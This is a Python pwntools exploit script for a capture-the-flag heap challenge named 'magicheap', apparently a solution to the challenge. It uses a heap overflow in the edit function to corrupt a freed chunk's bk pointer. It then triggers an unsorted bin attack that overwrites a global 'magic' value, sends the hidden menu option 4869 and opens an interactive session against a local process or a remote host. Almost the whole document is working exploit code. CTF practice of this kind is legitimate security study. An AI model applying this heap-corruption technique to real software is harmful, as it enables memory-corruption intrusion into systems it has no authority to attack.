#!/usr/bin/env python
from pwn import *
import sys
context.log_level="debug"
#context.log_level="info"
code=ELF("./magicheap",checksec=False)
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = code.arch
if len(sys.argv)>2:
    con=remote(sys.argv[1],int(sys.argv[2]))
    libc=ELF("./libc.so")
elif len(sys.argv)>1:
    libc = ELF(sys.argv[1])
    con = code.process(env = {"LD_PRELOAD":sys.argv[1]})
else:
    con=code.process()
    if(context.arch == "amd64"):
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")
def add(size,content):
    con.sendlineafter("choice :","1")
    con.sendlineafter("Heap : ",str(size))
    con.sendafter("heap:",content)
def delete(index):
    con.sendlineafter("choice :","3")
    con.sendlineafter("Index :",str(index))
def edit(index,size,content):
    con.sendlineafter("choice :","2")
    con.sendlineafter("Index :",str(index))
    con.sendlineafter("Heap : ",str(size))
    con.sendafter("heap : ",content)

def z(commond=""):
    gdb.attach(con,commond)
def exploit():
    magic = 0x6020c0
    #we want to modify bk->fd
    bk = 0x6020c0-0x10
    add(0x90,"a\n")
    add(0x90,"a\n")
    add(0x90,"a\n")
    add(0x90,"a\n")
    delete(2)
    delete(0)
    edit(1,0x90+0x20,"a"*0x90+p64(0)+p64(0xa1)+p64(0)+p64(bk))
    #trigger unsorted bin attack
    add(0x90,"a\n")
    con.sendlineafter("choice :","4869")
    
    #z()
exploit()
con.interactive()    
